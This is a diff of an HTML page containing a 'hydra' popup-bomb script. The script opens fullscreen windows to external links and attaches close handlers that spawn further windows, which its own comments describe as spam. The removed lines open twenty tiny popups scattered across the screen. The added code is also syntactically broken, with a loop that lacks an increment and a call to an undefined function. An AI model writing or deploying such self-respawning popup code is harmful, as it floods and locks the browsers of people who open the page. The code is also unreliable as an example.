@@ -1,22 +1,18 @@
 
 <html>
 <script>
-    var count = 2;
-    var win = [];
-    win[0] = window.open('about:blank', '_blank', 'fullscreen = yes');//open the first window
+    var count = 2;//open one popup initially
+    var win = [];//array of windows
+    win[0] = window.open('https://r.mtdv.me/fhdjlfjdsfhdskjfdslfhdsfjkdshfksdhfkds', '_blank', 'fullscreen = yes');//open the first window
     win[0].onunload = function() {
           hydra();
     }
 
-    function hydra() {
-  var times = 20
-   for(var i = 0; i < times; i++){
-   var popup = window.open("https://ratatosk231.github.io/i/", "", "width = 10, height = 10");
-   var x = Math.floor((Math.random() * 2000) + 1);
-   var y = Math.floor((Math.random() * 1000) + 1);
-   popup.moveTo(x, y);
-   }
-
+    function hydra() {//spam more windows!!!
+          for (i = 0; i < count) {
+              win[i] = window.open('about:blank', '_blank', 'fullscreen=yes');//create window
+              win[i].onunload = function() {//spam on close
+                     spam();
               }
           }
     }
